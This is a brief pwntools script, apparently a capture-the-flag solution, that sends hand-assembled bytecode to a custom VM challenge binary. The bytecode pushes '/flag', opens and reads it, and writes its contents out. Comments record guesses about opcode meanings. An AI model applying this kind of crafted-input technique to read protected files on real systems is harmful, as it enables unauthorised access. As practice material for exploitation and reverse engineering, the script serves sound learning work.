#!/usr/bin/python3
import time
from pwn import *

# colors
base = "\033[0m"
red = "\033[0;31m"
green = "\033[0;32m"
yellow = "\033[0;33m"

binpath = ("???")
context.binary = binary = ELF(binpath,checksec=False)
context.log_level = "error"

def _read(instruction):
    print(yellow + "Executing: " + green + instruction + base)
    shellcode = bytes.fromhex(instruction)
    
    p = process()
    p.sendline(shellcode)
    print(p.recvall(timeout=3).decode("utf-8"))
    
    exit_code = p.poll()
    print("exit code:", exit_code, "\n")
    p.close()
    time.sleep(0.5)

# _stack pointer = "40"
# _inst pointer = "02"

shellcode = "202f04"
shellcode += "010400"
shellcode += "206604"
shellcode += "010400"
shellcode += "206c04"
shellcode += "010400"
shellcode += "206104"
shellcode += "010400"
shellcode += "206704"
shellcode += "010400"
shellcode += "200004"
shellcode += "010400"
shellcode += "200104" # imm a = 01
shellcode += "200001" # b = 00
shellcode += "408080" # open?

shellcode += "200004" # imm a = 0
shellcode += "108004" # add a += d
shellcode += "20ff80" # imm c = ff
shellcode += "200001" # imm b = 00
shellcode += "408002" # maybe call read? store in d

shellcode += "200104" # imm a = 01
shellcode += "200001" # imm b = 00  0x01 == b ???
shellcode += "20ff80" # imm d = 0  (d) 0x80 MIGHT BE C???
shellcode += "402040" # write

shellcode += "400004" # exit
_read(shellcode)
